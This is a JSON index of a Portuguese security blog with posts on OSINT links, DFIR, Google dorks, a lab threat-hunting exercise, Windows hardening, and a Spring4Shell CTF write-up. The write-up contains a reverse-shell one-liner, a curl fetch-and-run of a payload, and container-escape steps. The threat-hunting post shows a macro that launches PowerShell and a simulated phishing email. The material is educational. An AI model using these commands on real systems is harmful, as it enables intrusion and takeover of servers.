[
  
  {
    "title": "Lista OSINT",
    "url": "/posts/Lista-OSINT/",
    "categories": "Papers, Lista OSINT",
    "tags": "OSINT",
    "date": "2023-01-10 00:00:00 -0300",
    





    
    "snippet": "Reuni algumas ‘tools/links’ sobre OSINT que anotei conforme fui encontrado pela WEB, acredito que possa agregar a quem venha ler este post.Quadros      https://www.osinttechniques.com/osint-tools.h...",
    "content": "Reuni algumas ‘tools/links’ sobre OSINT que anotei conforme fui encontrado pela WEB, acredito que possa agregar a quem venha ler este post.Quadros      https://www.osinttechniques.com/osint-tools.html        https://start.me/p/L1rEYQ/osint4all        https://osintframework.com/        https://inteltechniques .com/tools/        https://www.osintdojo.com/resources        https://start.me/p/b5Aow7/asint_collection        https://github.com/Ph055a/OSINT_Collection  Nome de usuário OSINT      https://github.com/sherlock-project/sherlock        https://inteltechniques.com/tools/Username.html        https://github.com/soxoj/maigret        https://namechk.com/        https://namecheckup.com/        https://whatsmyname.app/  Dados violados OSINT      https://hunter.io/        https://phonebook.cz/        https://github.com /ilektrojohn/creepy        https://github.com/opsdisk/metagoofil        https://intelx.io/        https://dehashed.com/        https://snusbase.com/        https://github.com/Ekultek/WhatBreach        https://haveibeenpwned.com  Domínio OSINT      https://lookup.icann.org/        https://subdomainfinder.c99.nl/        https://who.is/        https://censys.io/        https://www.shodan.io/        https://iplocation.net/        https://ipinfo.io/  Número de telefone OSINT      https://demo.phoneinfoga.crvx.fr/#        https://calleridtest.com/        https://freecarrierlookup.com/        https://www.truecaller.com/        https://github.com/megadose/ignorant  Endereço de e-mail OSINT       https://github.com/megadose/holehe/        https://github.com/sharsil/mailcat        https://github.com/thewhiteh4t/nexfil        https://epieos.com/        https://github.com/laramies /theHarvester  Pessoas OSINT       https://411.com/        http://whitepages.com/        https://www.fastpeoplesearch.com/        https://www.truepeoplesearch.com/        https:// www.voterrecords.com/        https://192.com/        https://ukphonebook.com        https://canada411.ca        https://canadapages.com        https://spokeo.com  TWITTER OSINT      https://www.twitonomy.com/        https://spoonbill.io/        https://accountanalysis.app/        https://github.com/twintproject/twint  Existem várias formas de praticar OSINT, vou listar uma aqui;Em si mesmoEsta é uma ótima maneira de melhorar o OSINT e também melhorar o seu OPSEC."
  },
  
  {
    "title": "Introducao ao DFIR",
    "url": "/posts/Introducao-DFIR/",
    "categories": "Papers, Introducao ao DFIR",
    "tags": "DFIR",
    "date": "2022-12-21 00:00:00 -0300",
    





    
    "snippet": "Com base nos últimos estudos que venho realizando sobre o assunto, me deparei com várias fontes de informações sobre o tema. Para fixação de aprendizado, resolvi tomar nota do que pude absorver dur...",
    "content": "Com base nos últimos estudos que venho realizando sobre o assunto, me deparei com várias fontes de informações sobre o tema. Para fixação de aprendizado, resolvi tomar nota do que pude absorver durante esse processo.DFIR?DFIR (Digital Forensics Incident Response) é uma das áreas de segurança cibernética. Uma equipe de DFIR é responsável por gerenciar a resposta a incidentes de segurança, incluindo a coleta de evidências de incidentes, a correção de seu impacto e a implementação de controles para evitar que ocorram novamente no futuro.Podemos dividir o DFIR em dois componentes principais:  Forense Digital: Examina os dados do sistema, a atividade do usuário e outras evidências digitais para determinar se um ataque está em andamento e quem está por trás da atividade.  Resposta a incidentes: Oprocesso geral que as organizações seguirão para preparar, detectar, conter e recuperar de violações de dados.Devido ao aumento contínuo de ataques a endpoints, o DFIR tornou-se uma competência central na estratégia de segurança de uma organização e nos recursos de caça a ameaças. A mudança para a nuvem e a adoção do trabalho remoto aumentaram a necessidade das organizações garantirem que todos os dispositivos conectados à rede estejam protegidos contra uma variedade de ameaças.Embora o DFIR se encaixe como um recurso de segurança reativo, o uso de ferramentas sofisticadas, como inteligência artificial (IA) e/ou aprendizado de máquina (ML) permitem que algumas organizações aproveitem as atividades do DFIR para medidas preventivas. Nesse caso, o DFIR também pode ser considerado um componente de uma política de segurança proativa.Como usar a perícia digital no planejamento de resposta a incidentes ?A perícia digital fornece as informações e evidências necessárias exigidas por um Centro de Estudos para Resposta e Tratamento de Incidentes em Computadores (CERT) ou Grupo de Resposta a Incidentes de Segurança (CSIRT) para responder a um incidente de segurança.A perícia digital pode incluir:  Análise forense do sistema de arquivos  Análise forense de memória  Análise forense de rede  Análise de logAlém de ajudar as equipes a responder a ataques, a perícia digital desempenha um papel importante em todo o processo de correção, podendo auxiliar a desenvolver e fortalecer medidas preventivas de segurança, isso permite que a organização reduza o risco geral e acelere os tempos de resposta futuros.Dito isso, abaixo segue algumas ferramentas retiradas originalmente da coleção disponibilizada pelo Meirwah.Ferramentas para simulação adversária;  APTSimulator  Caldera  Red Team Automation (RTA) — O RTAFerramenta de criação de imagem de disco;  AccessData FTK Imager  Bitscout — Bitscout  GetData Forensic Imager  GuymagerFerramentas de análise de log;  APT Hunter — APT-Hunter  Event Log Explorer  Observador de Log de Eventos  Kaspersky CyberTrace  LogonTracer  WELAFerramentas de análise de memória;  AVML  Evolve  inVtero.net  LiME  MemoryzeColeta de evidências;  bulk_extractor  CyLR  UAC — UAC  DFIR ORC — DFIR ORC  Fibratus  HoarderGerenciamento de incidentes;  Catalyst  CORTEX XSOAR  Resposta Rápida a Incidentes (FIR)  RTIRFerramenta Sandbox/Reverse;  AMAaaS  Any Run  CAPEv2  Cuckoo  Ghidra  VirustotalFerramentas “all-in-one”;  GRR Rapid Response  IRIS — IRIS  Sleuth Kit &amp; Autopsy  TheHive / Cortex  Velociraptor  X-Ways Forensics  Diffy  Digital Survey and Analysis Appliance (ADIA) — Dispositivo  Computer Aided Investigative Environment (CAINE)  Security Onion .  HELK  RedHunt-OSPLaybook;  GuardSIght Playbook Battle Cards  IRM  ThreatHunter-PlaybookBases de conhecimentos (Livros,videos,comunidade);  Resposta Aplicada a Incidentes — Livro de Steve Anson.  Arte da Forense da Memória — Detectando Malware e Ameaças na Memória do Windows, Linux e Mac.  Elaboração do Manual InfoSec: Plano Diretor de Monitoramento de Segurança e Resposta a Incidentes — Por Jeff Bollinger, Brandon Enright e Matthew Valites.  Forense Digital e Resposta a Incidentes: Técnicas e procedimentos de resposta a incidentes para responder a ameaças cibernéticas modernas — Por Gerard Johansen.  Introdução ao DFIR — Por Scott J. Roberts.  Técnicas de Resposta a Incidentes para Ataques de Ransomware — Por Oleg Skulkin.  Resposta a Incidentes Orientada por Inteligência — Por Scott J. Roberts, Rebekah Brown.  Practical Memory Forensics — Por Svetlana Ostrovskaya e Oleg Skulkin.  Incidente Response Overview — Conjunto de materiais sobre o assunto, disponibilizado pelo Joas A Santos.  Digital Forensics Discord Server — Comunidade de mais de 8.000 profissionais.  DFIR — Base de Conhecimento.  Base de Conhecimento de Artefatos Forenses Digitais  O Futuro da Resposta a Incidentes — Apresentado por Bruce Schneier na OWASP AppSecUSA 2015."
  },
  
  {
    "title": "OSINT-DORK",
    "url": "/posts/OSINT-DORK/",
    "categories": "Projetos, OSINT-DORK",
    "tags": "OSINT, Ferramentas, Projetos",
    "date": "2022-11-20 00:00:00 -0300",
    





    
    "snippet": "Tive a oportunidade de ministrar uma palestra no evento BSIDES 2022 sobre Técnicas de OSINT aplicadas ao Pentest, aproveitando a oportunidade, apresentei o OSINT-DORK, um projeto simples com coleçõ...",
    "content": "Tive a oportunidade de ministrar uma palestra no evento BSIDES 2022 sobre Técnicas de OSINT aplicadas ao Pentest, aproveitando a oportunidade, apresentei o OSINT-DORK, um projeto simples com coleções de dorks para facilitar a realização de DORKS pelo google, github e shodan.OSINT-DORKProjeto baseado no Shodan-DorkGithub-Dork (Mr.Koanti)Google dorks (faisalahmed)"
  },
  
  {
    "title": "Writeup Spring -UHCLABS",
    "url": "/posts/Writeup-Spring-UHCLABS/",
    "categories": "Writeup, UHCLABS",
    "tags": "Writeup, UHCLABS, CTF",
    "date": "2022-07-21 00:00:00 -0300",
    





    
    "snippet": "Inicialmente foi realizada uma varredura de portas para o IP, em busca de serviços com versões expostas e que contenham vulnerabilidades publicas.Vendo as portas 80,8080 abertas, e foi realizado o ...",
    "content": "Inicialmente foi realizada uma varredura de portas para o IP, em busca de serviços com versões expostas e que contenham vulnerabilidades publicas.Vendo as portas 80,8080 abertas, e foi realizado o acesso a ambas, e possível ver um site para porta 80, e uma mensagem de erro 404 na porta 8080O erro nos indica se tratar de um Spring boot, então buscamos realizar uma forca bruta de arquivos e diretórios neste host, foi possível identificar o arquivo teste que retorna um hello word ao ser acessado.Buscamos então por vulnerabilidade e foi possível encontrar o exploit publico de CVE 2022–22965 (Spring4Shell, SpringShell) que é uma vulnerabilidade no Spring Framework usa uma funcionalidade de vinculação de dados para vincular dados armazenados em uma solicitação HTTP a determinados aplicativos por um aplicativo.O bug existe no método getCachedIntrospectionResults, que pode ser usado para obter não autorizados a tais objetos passando seus nomes de classe por meio de uma solicitação HTTP. Ele cria os riscos de vazamento de dados e execução remota de código de classes de objetos especiais são usados.Para mais informações acesse o link abaixo:https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/Sabendo do que se trata podemos utilizar o exploit abaixo, que basicamente irá fazer um upload de uma webshell:https://github.com/lunasec-io/Spring4Shell-POCExecutamos o exploit:Após ele ter feito o upload da webshell, podemos executar comandos remotamente no servidorTentamos então “trigar” uma “reverse-shell”, criei um arquivo com o código    #!/bin/bash    /bin/bash -c ‘sh -i &gt;&amp; /dev/tcp/ip-vpn/443 0&gt;&amp;1’Deixei minha maquina executando na porta 443 com o ncat    nc -nvlp 443Abri uma porta 80 com o SimpleHTTPServer do python    python2.7 -m SimpleHTTPServer 80Utilizei o curl para fazer uma requisição para o nosso IP da vpn pegando a nossa payload e executando    curl http://ip-vpn/shell.sh -o /shell.sh    sh /shell.shRecebemos a shellIrei mudar de shell simples para um interativo    python3 -c “import pty;pty.spawn(‘/bin/bash’)”    Ctrl+Z    Write-Up — Spring8stty raw -echo;fg    Enter    export TERM=xtermDepois foi só pesquisar a primeira flag(não vou evidenciar aqui, por basta somente procurar no host)Para escalar lateralmente fizemos uma busca no host e foi possível identificar o IP do host 172.17.0.3Como o servidor não tem o nmap, podemos baixar um nmap estático e em seguida enviaremos para o servidor.https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmapFizemos um namp na rede para buscar IP ativos, encontramos dois, vamos focar no 172.17.0.2Realizamos um varredura nesse host e identificamos a porta 4040 abertafazendo uma requisição a esta porta podemos notar que se trata de uma aplicação web → Weave Scope, é uma ferramenta de visualização e monitoramento para Docker e Kubernetes Por padrão o Weave scope precisa subir em um docker privilegiado, sabendo disso podemos montar o disco do sistema principal dentro do docker do Weave scope.Para realizar o pivoting vamos usar a ferramenta chiselhttps://github.com/jpillora/chiselNo servidor iremos abrir uma porta 9000 e no cliente apontaremos a conexão do host 172.17.0.2 para essa porta, assim conseguimos acessa localmente.Podemos ver o terminal do Weave Scope, e com isso listar as partições.Agora podemos montar a partição na pasta mnt e ter acesso a flagobs: os ips podem estar diferente em prints pois houve a necessidade de restart do host"
  },
  
  {
    "title": "Threat hunting",
    "url": "/posts/Threat-hunting/",
    "categories": "Papers, Threat hunting",
    "tags": "Threat hunting, Windows",
    "date": "2022-04-26 00:00:00 -0300",
    





    
    "snippet": "Sabemos que o monitoramento desempenha um papel crucial na detecção e análise atividades maliciosas em um sistema. Com isso, resolvi criar esse laboratório para estudo pessoal com o intuito de moni...",
    "content": "Sabemos que o monitoramento desempenha um papel crucial na detecção e análise atividades maliciosas em um sistema. Com isso, resolvi criar esse laboratório para estudo pessoal com o intuito de monitorar e detectar logs de eventos, relacionados a atividades maliciosas usando o ELK Stack, usando o winlogbeat como ferramenta de envio de logs e configurando Sysmon para ajudar a identificar atividades de anomalias.Resolvi criar algo simplista, sem muito recurso, com o objetivo único de obter um maior entendimento do monitoramento e gerenciamento de eventos. Então, sem muita enrolação, ideia para este laboratório foi a seguinte;      Criar uma VM Windows, para ser o “alvo”.        Utilizar o ELK Stack para registrar os logs desse “alvo”.        Criar um arquivo excel com macro contendo um execução de powershell simples        Criar um “ataque” de e-mail phising para envio desse arquivo        Neste “alvo” fazer o acesso ao e-mail e o download de execução da planilha “Maliciosa”  Verificar os logs obtidos do “alvo”.ELK StackResumidamente o ELK Stack é um conjunto de ferramentas gratuitas e abertas para ingestão, enriquecimento, armazenamento, análise e visualização de dados. É chamada de ELK pelas iniciais de Elasticsearch, Logstash e Kibana.  Elasticsearch: É um mecanismo de busca tranquilo que armazena ou detém todos os Dados coletados.  Logstash: É o componente de processamento de dados que envia dados de entrada para elasticesearch.  Kibana: Uma interface web para pesquisar e visualizar logs.Essa arquitetura geralmente tem algum tipo de log/evento encaminhado usando algum Beat(são agentes instalados nos hosts para coletar diferentes tipos de informações a serem direcionadas para dentro da stack) rodando em cada host monitorado, que envia os dados para o Logstash, que os analisa, enriquece e os envia para um banco de dados não relacional (neste caso Elastic) que pode ser consultada e visualizada através de dashboards (Kibana).Exemplo do esquema abaixo usando o FileBeatNo entanto, este cenário demanda que seja 100% manual, é preciso consultar e analisar manualmente os dados para detectar eventos potencialmente maliciosos.Neste caso, utilizaremos uma o Elastic-SIEM em Docker, que nos possibilita usar as funcionalidades do Elastic Security.O laboratório que montamos até agora é uma versão simplificada da plataforma HELK, criada por Roberto Rodrigues. Para quem não conhece, dê uma olhada, é incrível. Possui recursos de processamento distribuído e aprendizado de máquina, Apache Spark, Hadoop, GraphFrames e Jupiter Notebooks.Preparando o “Alvo”Gostaria de deixar claro que o intuito não será abordar o passo a passo de Instalação/configuração de cada item usado, então deixarei somente os links que por si só já descrevem o seu uso.Já com Elastic Siem rodando em Docker, partimos para o “alvo” que neste caso será uma VM com Windows 11, e nela usaremos o winlogbeat e o sysmon, para que os logs sejam coletados e enviados, para o nosso Elastic Siem.Sysmon é um software que faz parte da suite Sysinternals da Microsoft. Ele em si é um serviço do Windows que, após ativado, monitora as diversas atividades que não são logadas por padrão, no sistema de eventos do Windows.-Winlogbeat: Faz parte do Beats mencionado acima, é um agente cujo objetivo é coletar dados de arquivos de logs do WindowsNeste caso esta configurado abaixo para coletar logs do Sysmon.Habilitando Logs do PowershellPara que fosse possível ter todo controle da execução do powershell precisamos habilita-lo, assim podemos ter em registro os detalhes da execução conforme o PowerShell é executado, incluindo inicialização de variável e invocações de comando. O log do módulo registrará partes de scripts, alguns códigos desofuscados e alguns dados formatados para saída.Esse log capturará alguns detalhes perdidos por outras fontes de log do PowerShell, embora possa não capturar de forma confiável os comandos executados.Para habilitar o log do módulo:&lt;Nas configurações do GPO “Windows PowerShell”, defina “Ativar Log do Módulo” como habilitado.      No painel “Opções”, clique no botão para mostrar o Nome do Módulo.        Na janela Module Names, digite * para registrar todos os módulos.        Clique em “OK” na janela “Nomes dos módulos”.        Clique em “OK” na janela “Module Logging”.  Criando o arquivo MaliciosoCriamos um arquivo Excel com um código simples de VBA, que basicamente gerar um alerta com o usuário “logado” na maquina e executa um Powershell que usa a classe Win32_Desktop WMI para representa as características comuns da área de trabalho de um usuário.Private Sub Workbook_Open() MsgBox UsuarioRedeEnd Sub Function UsuarioRede() As String Dim GetUserN Dim Objnetwork Dim pscmd Set ObjNetwork = createObject(“WScript.Network”) GetUserN = ObjNetwork.UserName UsuarioRede = GetUserN pscmd = “pscmd = “PowerShell -Command “”{Get-CimInstance -ClassName Win32_Desktop}”””” Shell pscmdEnd FunctionEnviando o arquivo MaliciosoPara fazer o envido do documento simulando um e-mail de phising, usarei a ferramenta SET (Social Engineering Toolkit, Sim, a mesma usada pelo Mr. Robot rsrs). O SET é uma ferramenta de código aberto orientada a Python, destinada a testes de penetração em torno da Engenharia Social.Criei uma conta fictícia para o envio do e-mail contendo o arquivo.Baixando o arquivo e executandoComo neste laboratório a ideia e ter uma visão básica, e usa-lo para implementar novas formas, o “ataque” não foi algo sofisticado e por isso não teve necessidade de se tentar ofuscar o código para que não fosse detectado por sistema de AV.Então para que isso funcionasse da forma simples, desabilitei o firewall e defender do Windows, e desabilitei também o “trusted” da macro no Excel.Feito isso, partimos para o download do arquivo malicioso, e posteriormente o executamosVerificando EventosOlhando os eventos gerados após a execução do arquivo, podemos ver nos logs do Symon alguns informações interessantes;ParentImage: Caminho do arquivo que gerou/criou o processo principalParentCommandLine : Argumentos que foram passados para o executável associado ao processo paiOriginalFileName : Nome do arquivo original do cabeçalho PE, adicionado na compilaçãoCommandLine : Argumentos que foram passados para o executável associado ao processo principalÉ possível ver que o ParentImage mostra o caminho do office16\\execel.exe, e que o ParentCommandLine diz que o Excel quem executou o arquivo documentos.xlsm(Arquivo malicioso). Mas pra cima e possível ver que o OriginalFileName é o PowerShell.exe, e que o CommandLine é o comando que “Malicioso” que foi inserido na macro do arquivo.Fazendo Pesquisa no Elastic ELKNo Discover, selecionei o índice para winloagbeat, isso carregará os dados indexados com o índice selecionado.Existem 2 maneiras de usar a opção de pesquisa.Kibana Query Language (KQL): A Kibana Query Language (KQL) é uma sintaxe simples para filtrar dados do Elasticsearch usando pesquisa de texto livre ou pesquisa baseada em campo.Lucene query syntax: a sintaxe de consulta do Lucene está disponível para usuários do Kibana que optam por não usar a linguagem de consulta do Kibana.Faremos a consulta como KQL e buscaremos pelo seguinte;winlog.channel:”Microsoft-Windows-Sysmon/Operational” and winlog.event_data.Image:*powershell* and winlog.event_data.ParentCommandLine:*Office*DetectionsAgora queremos ter um regra de detecção baseado neste evento de origem suspeita, e criar alertas para quando as condições dessa regra forem atendidas.In Security → Detections → manage detection rules, crie uma novaPodemos verificar regras pesquisam índices periodicamente (como endgame-* e filebeat-*) neste caso, queremos pesquisar apenas no índice winlogbeat.Quando um alerta é criado, seu status é Aberto. Para ajudar a rastrear investigações, o status de um alerta pode ser definido como Aberto, Reconhecido ou Fechado.Quando executamos o arquivo excel no “alvo”, ele gerou o alerta.Vendo descriçãoPodemos ver a descrição deste alertaCriando CasoOs casos são usados ​​para abrir e rastrear problemas de segurança diretamente no aplicativo Elastic Security. Todos os casos listam o relator original e todos os usuários que contribuem para um caso (participantes). Os comentários suportam a sintaxe Markdown e permitem vincular a Timelines salvas.Neste pequeno laboratório de estudo de caso, o objetivo foi estudar a aplicabilidade do ELK Stack em um cenário, de forma que os logs de eventos de segurança importantes sejam tratados. Gerando alertas que podem ser gerenciados, mas a ideia e continuar esse laboratório e implementar pouco a pouco novas Features, baseando no projeto HELK.REFERENCIAhttps://imsafe.com.br/phishing-pratico-com-hiddeneye/https://enigma0x3.net/2016/03/15/phishing-with-empire/https://infosecwriteups.com/sending-emails-using-social-engineering-toolkit-setoolkit-97427712c809https://infosecwriteups.com/sending-emails-using-social-engineering-toolkit-setoolkit-97427712c809https://www.hackingarticles.in/threat-hunting-log-monitoring-lab-setup-with-elk/https://www.digitalocean.com/community/tutorials/how-to-create-rules-timelines-and-cases-from-suricata-events-using-kibana-s-siem-appshttps://cyberwardog.blogspot.com/2017/02/setting-up-pentesting-i-mean-threat_87.htmlhttps://rootdse.org/posts/understanding-sysmon-events/"
  },
  
  {
    "title": "Hardening Windows Server",
    "url": "/posts/Hardening-Windows-Server/",
    "categories": "Papers, Hardening Windows Server",
    "tags": "Windows, Hardening",
    "date": "2022-04-12 00:00:00 -0300",
    





    
    "snippet": "Neste meu primeiro artigo, abordarei um termo revisado recentemente de um curso ao qual estou, Server Hardening.Sendo bem simplista, Hardening seria um conjunto de processos de reforço de segurança...",
    "content": "Neste meu primeiro artigo, abordarei um termo revisado recentemente de um curso ao qual estou, Server Hardening.Sendo bem simplista, Hardening seria um conjunto de processos de reforço de segurança aplicadas ao sistema. A realização de hardening em sistemas não é apenas uma boa prática, em algumas áreas pode ser uma exigência regulamentar, o objetivo é minimizar os riscos à segurança.A ISO/IEC 27002 é uma das normas componentes da série ISO/IEC 27000 que mais abrangem aos processos de hardening. Apresentando um conjunto de boas práticas, para justamente estabelecer controles de segurança da informação.Os Benchmarks do CIS são um recurso abrangente de documentos que abrangem muitos sistemas operacionais e aplicativos.Para sistemas Windows, a Microsoft publica linhas de base e ferramentas de segurança para verificar a conformidade dos sistemas em relação a eles.OpenSCAP para sistemas Linux. que fornece ferramentas de código aberto para identificar e corrigir problemas de segurança.Neste pequeno artigo iremos focar no Hardening do Windows Server, que envolve identificar e remediar vulnerabilidades de segurança.Aqui estão algumas práticas de Hardening do Windows Server. Lembre-se é somente um ponto de partida, deve-se revisar e alterar de acordo com as necessidades da organização.Segurança Organizacional  Mantenha um registro de inventário para cada servidor.  Teste minuciosamente e valide cada alteração proposta para hardware ou software do servidor antes de fazer a mudança no ambiente de produção.  Realizar regularmente uma avaliação de risco.Preparação do servidor do Windows  Defina uma senha de BIOS/firmware para evitar alterações não autorizadas nas configurações de inicialização do servidor.  Desabilitar a logon administrativa automática no console de recuperação.  Configure a ordem de inicialização do dispositivo para evitar a inicialização não autorizada de mídia alternativa.Instalação do servidor Windows  Certifique-se de que todos os patches, hotfixes e pacotes de serviço apropriados sejam aplicados prontamente.  Depois de instalar o Windows Server, atualize-o imediatamente com os patches mais recentes via WSUS ou SCCM. (Os patches de segurança resolvem vulnerabilidades conhecidas que os atacantes poderiam explorar para comprometer um sistema.)  Habilite a notificação automática da disponibilidade do patch. Sempre que um patch é liberado, ele deve ser analisado, testado e aplicado em tempo hábil usando WSUS ou SCCM.Segurança da conta de usuário  Certifique-se de que suas senhas administrativas e do sistema atendam às melhores práticas de senha.  Certifique-se de que todas as senhas sejam alteradas a cada 90 dias.  Proibir os usuários de criar e fazer login com contas Microsoft.  Desabilitar a conta do convidado.  Não permita que permissões “todos” se apliquem a usuários anônimos.  Não permita a enumeração anônima de contas e ações SAM.  Desativar a tradução anônima SID/Name.  Desabilitar ou excluir prontamente contas de usuário não usadas.Configuração de segurança de rede  Habilite o firewall do Windows em todos os perfis (domínio, privado, público) e configure-o para bloquear o tráfego de entrada por padrão.  Execute o bloqueio da porta no nível de configuração da rede.  Restringir a capacidade de acessar cada computador da rede apenas para usuários autenticados.  Se o RDP for utilizado, defina o nível de criptografia de conexão RDP para alto.  Remova a ativação do LMhosts lookup.  Desabilitar o NetBIOS no TCP/IP.  Remova ncacn_ip_tcp.  Configure tanto o Microsoft Network Client quanto o Microsoft Network Server para sempre assinar comunicações digitalmente.  Desativar o envio de senhas não criptografadas para servidores SMB de terceiros.  Permita que o Sistema Local use a identidade do computador para NTLM.  Configure tipos de criptografia permitidos para Kerberos.  Não armazene os valores de hash do LAN Manager.  Defina o nível de autenticação do LAN Manager para permitir apenas NTLMv2 e recusar LM e NTLM.  Remova o compartilhamento de arquivos e impressões das configurações da rede. O compartilhamento de arquivos e impressões pode permitir que qualquer pessoa se conecte a um servidor e acesse dados críticos sem exigir um ID ou senha do usuário.Configuração de segurança do registroCertifique-se de que todos os administradores aproveitem o tempo para entender completamente como funciona o registro e o propósito de cada uma de suas várias chaves. Muitas das vulnerabilidades no sistema operacional Windows podem ser corrigidas alterando chaves específicas, conforme exemplos abaixo.  Defina o AutoShareServer para 0.  Defina AutoShareWks para 0.Isso desabilitaria os compartilhamentos administrativos (ou seja: o compartilhamento c$ oculto).  Exclua todos os dados de valor DENTRO da tecla NullSessionPipes.  Exclua todos os dados de valor DENTRO da tecla NullSessionShares.Isso remove o acesso de NullSessions. Entre outras coisas, remover o acesso impediria um usuário remoto de enumerar contas de usuário e compartilhamentos em seu sistema.Configurações gerais de segurança  Remover todos os serviços desnecessários do sistema.  Habilite o EFS (Encrypting File System, sistema de arquivos de criptografia incorporado) com NTFS ou BitLocker no Windows Server.  Não use AUTORUN. Caso contrário, o código não confiável pode ser executado sem o conhecimento direto do usuário; por exemplo, os atacantes podem colocar um CD na máquina e fazer com que seu próprio script seja executado.  Exibir um aviso legal antes do login do usuário exemplo: “O uso não autorizado deste computador e recursos de rede é proibido…”  Exija ctrl+Alt+Del para logins interativos.  Configure um limite de inatividade da máquina para proteger sessões ociosas.  Certifique-se de que todos os volumes estejam usando o sistema de arquivos NTFS.  Configure permissões locais de arquivo/pasta. Outro procedimento de segurança importante, mas muitas vezes negligenciado, é bloquear as permissões de nível de arquivo para o servidor. Por padrão, o Windows não aplica restrições específicas em nenhum arquivo ou pasta local; o grupo Todos recebe permissões completas para a maioria da máquina. Remova esse grupo e, em vez disso, conceda acesso a arquivos e pastas usando grupos baseados em papel com base no princípio de menor privilégio. Todas as tentativas devem ser feitas para remover o Guest, Everyone e ANONYMOUS LOGON das listas de direitos do usuário.  Defina a data/hora do sistema e configure-a para sincronizar com servidores NTP.Configurações de políticas de auditoria  Habilitar a política de auditoria de acordo com as melhores práticas da política de auditoria.  Configure o envio de log para algum SIEM para monitoramento.  Guia de segurança de software  Instale e habilite o software antivírus. Configure-o para atualizar diariamente.  Instale e habilite o software anti-spyware. Configure-o para atualizar diariamente.  Instale software para verificar a integridade de arquivos críticos do sistema operacional. O Windows tem um recurso chamado Windows Resource Protection que verifica automaticamente certos arquivos-chave e os substitui se eles forem corrompidos.REFERÊNCIAhttps://www.linkedin.com/pulse/hardening-de-servidores-leandro-cabral/?originalSubdomain=pthttps://blog.convisoappsec.com/hardening-de-sistemas-o-que-e-e-como-executar/https://www.osnn.net/threads/help-with-security-settings.42359/http://www.security-forums.com/viewtopic.php?printertopic=1&amp;t=31900&amp;start=0&amp;postdays=0&amp;postorder=asc&amp;vote=viewresult&amp;sid=459ea285cede97e536ad6947328e47"
  }
  
]

